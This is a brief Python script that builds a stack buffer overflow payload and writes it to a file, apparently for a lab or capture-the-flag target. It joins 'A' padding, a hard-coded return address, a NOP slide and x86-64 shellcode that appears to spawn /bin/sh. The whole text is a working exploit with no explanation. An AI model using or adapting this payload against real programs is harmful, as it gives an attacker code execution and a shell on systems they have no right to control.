from __future__ import print_function

override_length = 136

padding = 'A' * override_length
return_address = "\x00\x00\x7f\xff\xff\xff\xe5\x40"[::-1]
nop_slide = "\x90" * 128
shell_code = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

payload = padding + return_address + nop_slide + shell_code

with open('/home/user/input.txt', 'w') as f:
            print(payload, file=f)

